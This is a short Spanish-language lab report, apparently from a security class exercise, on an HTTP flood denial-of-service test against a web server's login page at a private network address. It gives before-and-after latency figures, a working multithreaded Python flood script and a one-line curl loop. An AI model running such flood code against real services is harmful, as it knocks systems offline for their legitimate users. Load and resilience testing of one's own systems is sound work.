# 07 - Ataque DDoS (Denegación de Servicio)

**Responsable:** Tomi

## Descripción
Ataque de denegación de servicio a nivel de aplicación (L7) mediante HTTP flood. Se enviaron cientos de requests concurrentes para saturar el servidor web.

## Herramientas
- Python (requests + ThreadPoolExecutor)
- 100 hilos concurrentes
- Duración: 15 segundos

## Resultados

### Línea base (sin ataque)
```
HTTP 200 - Tiempo: 0.036s (36ms)
```

### Durante el ataque
```
Total requests: 1680 en 15s
Requests/sec: 104.6
Tiempo promedio: 0.925s
Tiempo P95: 1.045s
```

### Comparativa
| Métrica | Normal | Bajo DDoS | Degradación |
|---------|--------|-----------|-------------|
| Tiempo respuesta | 36ms | 925ms avg | **25x más lento** |
| P95 | - | 1,045ms | **29x más lento** |
| Errores | 0% | 0% | Sin errores |

## Código del ataque
```python
import threading
import requests
import time
from concurrent.futures import ThreadPoolExecutor

TARGET = "http://192.168.18.38:8001/login"
CONCURRENCY = 100
DURATION = 15

results = []
stop = False

def attack():
    while not stop:
        try:
            start = time.time()
            r = requests.get(TARGET, timeout=5)
            elapsed = time.time() - start
            results.append(("OK", r.status_code, elapsed))
        except:
            pass

start = time.time()
with ThreadPoolExecutor(max_workers=CONCURRENCY) as ex:
    futures = [ex.submit(attack) for _ in range(CONCURRENCY)]
    time.sleep(DURATION)
    stop = True
```

## Comando rápido (una línea)
```bash
# 100 requests concurrentes
for i in {1..100}; do curl -s http://192.168.18.38:8001/login -o /dev/null & done; wait
```
